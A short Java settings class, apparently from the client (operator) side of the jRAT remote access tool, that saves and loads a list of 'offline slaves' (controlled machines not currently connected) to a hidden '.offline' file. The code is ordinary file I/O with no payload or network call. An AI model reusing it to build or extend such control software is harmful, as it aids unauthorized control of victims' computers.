package se.jrat.client.settings;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;

import se.jrat.client.Globals;
import se.jrat.client.OfflineSlave;

public class OfflineSlaves extends AbstractSettings {
	
	private static final List<OfflineSlave> LIST = new ArrayList<OfflineSlave>();
	
	private static final OfflineSlaves INSTANCE = new OfflineSlaves();
	
	public static OfflineSlaves getGlobal() {
		return INSTANCE;
	}

	@Override
	public void save() throws Exception {
		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(getFile())));
		
		for (OfflineSlave os : LIST) {
			writer.write(OfflineSlave.toString(os));
			writer.newLine();
		}
		
		writer.close();
	}

	@Override
	public void load() throws Exception {
		LIST.clear();
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(getFile())));
		
		String line;
		
		while ((line = reader.readLine()) != null) {
			LIST.add(OfflineSlave.fromString(line));
		}
		
		reader.close();
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".offline");
	}

}
